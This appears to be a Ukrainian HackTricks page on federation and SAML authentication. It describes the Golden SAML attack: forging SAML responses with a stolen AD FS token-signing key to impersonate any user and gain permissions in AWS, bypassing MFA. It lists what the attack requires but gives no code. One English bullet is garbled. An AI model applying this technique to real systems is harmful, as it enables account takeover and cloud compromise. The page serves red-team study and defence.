# –§–µ–¥–µ—Ä–∞—Ü—ñ—è

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º—É—î—Ç—å—Å—è –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫—ñ–Ω–≥-—Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

[–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**–§–µ–¥–µ—Ä–∞—Ü—ñ—è** - —Ü–µ –∫–æ–ª–µ–∫—Ü—ñ—è **–¥–æ–º–µ–Ω—ñ–≤**, —è–∫—ñ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ **–¥–æ–≤—ñ—Ä—É**. –†—ñ–≤–µ–Ω—å –¥–æ–≤—ñ—Ä–∏ –º–æ–∂–µ –≤–∞—Ä—ñ—é–≤–∞—Ç–∏—Å—è, –∞–ª–µ –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é** —Ç–∞ –º–∞–π–∂–µ –∑–∞–≤–∂–¥–∏ –≤–∫–ª—é—á–∞—î **–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é**. –¢–∏–ø–æ–≤–∞ —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—è –º–æ–∂–µ –≤–∫–ª—é—á–∞—Ç–∏ **–∫—ñ–ª—å–∫–∞ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π**, —è–∫—ñ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ **–¥–æ–≤—ñ—Ä—É** –¥–ª—è **—Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É** –¥–æ –Ω–∞–±–æ—Ä—É —Ä–µ—Å—É—Ä—Å—ñ–≤.

–í–∏ –º–æ–∂–µ—Ç–µ **—Ñ–µ–¥–µ—Ä—É–≤–∞—Ç–∏ –≤–∞—à–µ** —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ **–Ω–∞ –º—ñ—Å—Ü—ñ** –∑ Azure AD —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—é –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –¶–µ–π –º–µ—Ç–æ–¥ –≤—Ö–æ–¥—É –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ –≤—Å—ñ **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤—ñ–¥–±—É–≤–∞—é—Ç—å—Å—è –Ω–∞ –º—ñ—Å—Ü—ñ**. –¶–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –±—ñ–ª—å—à –∂–æ—Ä—Å—Ç–∫—ñ —Ä—ñ–≤–Ω—ñ –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É. –î–æ—Å—Ç—É–ø–Ω–∞ —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—è –∑ **AD FS** —Ç–∞ PingFederate.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

–û—Å–Ω–æ–≤–Ω–∞ —ñ–¥–µ—è —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤—Å—è **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è** –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –≤ **—Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –Ω–∞ –º—ñ—Å—Ü—ñ**, –∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –æ—Ç—Ä–∏–º—É—é—Ç—å SSO —É –≤—Å—ñ—Ö –¥–æ–≤—ñ—Ä–µ–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ö–º–∞—Ä–Ω–∏—Ö** –¥–æ–¥–∞—Ç–∫—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–≤–æ—ó **–ª–æ–∫–∞–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**.

–î–ª—è **–æ–±–º—ñ–Ω—É** –≤—Å—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **–ú–æ–≤–∞ –º–∞—Ä–∫—É–≤–∞–Ω–Ω—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω—å –±–µ–∑–ø–µ–∫–∏ (SAML)** –º—ñ–∂ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏.

–£ –±—É–¥—å-—è–∫—ñ–π —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó —î —Ç—Ä–∏ —Å—Ç–æ—Ä–æ–Ω–∏:

* –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –∞–±–æ –∫–ª—ñ—î–Ω—Ç
* –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ (IdP)
* –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –ø–æ—Å–ª—É–≥ (SP)

(–ó–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. –°–ø–æ—á–∞—Ç–∫—É –¥–æ–¥–∞—Ç–æ–∫ (–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –ø–æ—Å–ª—É–≥ –∞–±–æ SP, —Ç–∞–∫–∏–π —è–∫ –∫–æ–Ω—Å–æ–ª—å AWS –∞–±–æ –≤–µ–±-–∫–ª—ñ—î–Ω—Ç vSphere) –≤—ñ–¥–≤—ñ–¥—É—î—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º. –¶–µ–π –∫—Ä–æ–∫ –º–æ–∂–µ –±—É—Ç–∏ –ø—Ä–æ–ø—É—â–µ–Ω–∏–π, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ –∫–ª—ñ—î–Ω—Ç –Ω–∞–ø—Ä—è–º—É –ø–æ—Ç—Ä–∞–ø–ª—è—î –¥–æ IdP (–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ) –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
2. –ù–∞—Å—Ç—É–ø–Ω–æ SP –≤–∏–∑–Ω–∞—á–∞—î –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π IdP (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, AD FS, Okta) –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ü–æ—Ç—ñ–º –≤—ñ–Ω —Å—Ç–≤–æ—Ä—é—î –∑–∞–ø–∏—Ç AuthnRequest SAML (–ú–æ–≤–∞ –º–∞—Ä–∫—É–≤–∞–Ω–Ω—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω—å –±–µ–∑–ø–µ–∫–∏) —Ç–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –∫–ª—ñ—î–Ω—Ç–∞ –¥–æ –æ–±—Ä–∞–Ω–æ–≥–æ IdP.
3. IdP –±–µ—Ä–µ –Ω–∞ —Å–µ–±–µ, –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ü—ñ—Å–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó IdP —Ñ–æ—Ä–º—É—î SAMLResponse —Ç–∞ –ø–µ—Ä–µ—Å–∏–ª–∞—î –π–æ–≥–æ –¥–æ SP —á–µ—Ä–µ–∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
4. –ù–∞—Ä–µ—à—Ç—ñ, SP –æ—Ü—ñ–Ω—é—î SAMLResponse. –Ø–∫—â–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—Ä–æ–π—à–ª–∞ —É—Å–ø—ñ—à–Ω–æ, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –¥–æ–≤—ñ—Ä–∏ –∑ IdP, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –Ω–∞–¥–∞—î—Ç—å—Å—è –¥–æ—Å—Ç—É–ø. –¶–µ –ø–æ–∑–Ω–∞—á–∞—î –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å—É –≤—Ö–æ–¥—É, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Å–ª—É–≥—É.

**–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é SAML —Ç–∞ –∑–∞–≥–∞–ª—å–Ω—ñ –∞—Ç–∞–∫–∏, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## –ü–µ—Ä–µ—Ö—ñ–¥

* AD FS - —Ü–µ –º–æ–¥–µ–ª—å —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø—Ä–µ—Ç–µ–Ω–∑—ñ–π.
* "..–ø—Ä–µ—Ç–µ–Ω–∑—ñ—ó - —Ü–µ –ø—Ä–æ—Å—Ç–æ –∑–∞—è–≤–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —ñ–º'—è, —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å, –≥—Ä—É–ø–∞), —è–∫—ñ —Ä–æ–±–ª—è—Ç—å—Å—è –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –¥–æ—Å—Ç—É–ø—É –¥–æ –∑–∞—Å—Ç–æ—Å—É–Ω–∫—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø—Ä–µ—Ç–µ–Ω–∑—ñ–π, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏—Ö –±—É–¥—å-–¥–µ –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ."
* –ü—Ä–µ—Ç–µ–Ω–∑—ñ—ó –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–æ–∫–µ–Ω—ñ–≤ SAML, –∞ –ø–æ—Ç—ñ–º –ø—ñ–¥–ø–∏—Å—É—é—Ç—å—Å—è –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω–æ—Å—Ç—ñ IdP.
* –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å –∑–∞ ImmutableID. –í—ñ–Ω —î –≥–ª–æ–±–∞–ª—å–Ω–æ —É–Ω—ñ–∫–∞–ª—å–Ω–∏–º —ñ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ Azure AD.
* TheImmuatbleIDisstoredon-premasms-DS-ConsistencyGuidforthe user and/or can be derived from the GUID of the user.
* –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**–ê—Ç–∞–∫–∞ Golden SAML:**

* –£ ADFS –≤—ñ–¥–ø–æ–≤—ñ–¥—å SAML –ø—ñ–¥–ø–∏—Å—É—î—Ç—å—Å—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤.
* –Ø–∫—â–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π, –º–æ–∂–ª–∏–≤–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –≤ Azure AD —è–∫ –ë–£–î–¨-–Ø–ö–ò–ô –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–∏–π –∑ Azure AD!
* –¢–æ—á–Ω–æ —Ç–∞–∫ —Å–∞–º–æ, —è–∫ —É –Ω–∞—à–æ–º—É –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—ñ PTA, –∑–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ MFA –Ω–µ –º–∞—Ç–∏–º–µ –∂–æ–¥–Ω–æ–≥–æ –µ—Ñ–µ–∫—Ç—É, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Ñ–∞–ª—å—Å–∏—Ñ—ñ–∫—É—î–º–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.
* –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–¥–æ–±—É—Ç–∏–π –∑ —Å–µ—Ä–≤–µ—Ä–∞ AD FS –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ DA —Ç–∞ –ø–æ—Ç—ñ–º –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑ –±—É–¥—å-—è–∫–æ–≥–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ–≥–æ –¥–æ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É –ø—Ä–∏—Å—Ç—Ä–æ—é.
* –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

–ü—Ä–æ—Ü–µ—Å, —É —è–∫–æ–º—É **–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ (IdP)** —Å—Ç–≤–æ—Ä—é—î **SAMLResponse** –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –≤—Ö–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —î –∫–ª—é—á–æ–≤–∏–º. –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó IdP, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –º–æ–∂–µ –±—É—Ç–∏ **–ø—ñ–¥–ø–∏—Å–∞–Ω–∞** –∞–±–æ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ IdP**. –¶—è –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ –¥–æ–∑–≤–æ–ª—è—î **–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É –ø–æ—Å–ª—É–≥ (SP)** –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –∞–≤—Ç–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å SAMLResponse, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏, —â–æ –≤—ñ–Ω –¥—ñ–π—Å–Ω–æ –±—É–≤ –≤–∏–¥–∞–Ω–∏–π –¥–æ–≤—ñ—Ä–µ–Ω–∏–º IdP.

–ú–æ–∂–Ω–∞ –ø—Ä–æ–≤–µ—Å—Ç–∏ –ø–∞—Ä–∞–ª–µ–ª—å –∑ [–∞—Ç–∞–∫–æ—é –Ω–∞ –∑–æ–ª–æ—Ç–∏–π –∫–≤–∏—Ç–æ–∫](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), –¥–µ –∫–ª—é—á, —è–∫–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —Ç–∞ –¥–æ–∑–≤–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (KRBTGT –¥–ª—è –∑–æ–ª–æ—Ç–∏—Ö –∫–≤–∏—Ç–∫—ñ–≤, –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤ –¥–ª—è –∑–æ–ª–æ—Ç–∏—Ö SAML), –º–æ–∂–µ –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** (TGT –∞–±–æ SAMLResponse). –¶–µ –¥–æ–∑–≤–æ–ª—è—î –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –Ω–∞–¥–∞—é—á–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ SP.

–ó–æ–ª–æ—Ç—ñ SAML –º–∞—é—Ç—å –ø–µ–≤–Ω—ñ –ø–µ—Ä–µ–≤–∞–≥–∏:

* –á—Ö –º–æ–∂–Ω–∞ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ**, –Ω–µ –±–µ—Ä—É—á–∏ —É—á–∞—Å—Ç—å —É –¥–æ–º–µ–Ω—ñ –∞–±–æ —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó –ø–∏—Ç–∞–Ω–Ω—è.
* –í–æ–Ω–∏ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º–∏ –Ω–∞–≤—ñ—Ç—å –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º **–¥–≤–æ—Ñ–∞–∫—Ç–æ—Ä–Ω–∏–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—î—é (2FA)**.
* –ü—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤ **–Ω–µ –æ–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ**.
* **–ó–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–µ –∞–Ω—É–ª—é—î** –≤–∂–µ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π SAML.

#### AWS + AD FS + Golden SAML

[–°–ª—É–∂–±–∏ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É Federation (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) - —Ü–µ —Å–ª—É–∂–±–∞ Microsoft, —è–∫–∞ —Å–ø—Ä–∏—è—î **–±–µ–∑–ø–µ—á–Ω–æ–º—É –æ–±–º—ñ–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å** –º—ñ–∂ –¥–æ–≤—ñ—Ä–µ–Ω–∏–º–∏ –±—ñ–∑–Ω–µ—Å-–ø–∞—Ä—Ç–Ω–µ—Ä–∞–º–∏ (—Ñ–µ–¥–µ—Ä–∞—Ü—ñ—è). –ü–æ —Å—É—Ç—ñ, –≤–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î —Å–ª—É–∂–±—ñ –¥–æ–º–µ–Ω—É –æ–±–º—ñ–Ω—é–≤–∞—Ç–∏—Å—è —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—è–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —ñ–Ω—à–∏–º–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏ –ø–æ—Å–ª—É–≥ —É –º–µ–∂–∞—Ö —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó.

–ó AWS, —è–∫–∞ –¥–æ–≤—ñ—Ä—è—î –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É –¥–æ–º–µ–Ω—É (—É —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó), —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ **–æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±—É–¥—å-—è–∫–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ AWS**. –î–ª—è –∞—Ç–∞–∫–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π **–ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥–ø–∏—Å—É –æ–±'—î–∫—Ç—ñ–≤ SAML**, —Å—Ö–æ–∂–∏–π –Ω–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å KRBTGT —É –∞—Ç–∞–∫–∞—Ö –Ω–∞ –∑–æ–ª–æ—Ç–∏–π –∫–≤–∏—Ç–æ–∫. –î–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD FS –¥–æ—Å—Ç–∞—Ç–Ω—ñ–π –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞.

–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ –∑–æ–ª–æ—Ç–æ–≥–æ SAML –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ:

* **–ü—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤**
* **–ü—É–±–ª—ñ—á–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç IdP**
* **–Ü–º'—è IdP**
* **–Ü–º'—è —Ä–æ–ª—ñ (—Ä–æ–ª—å –¥–ª—è –ø—Ä–∏–ø—É—â–µ–Ω–Ω—è)**
* Domain\username
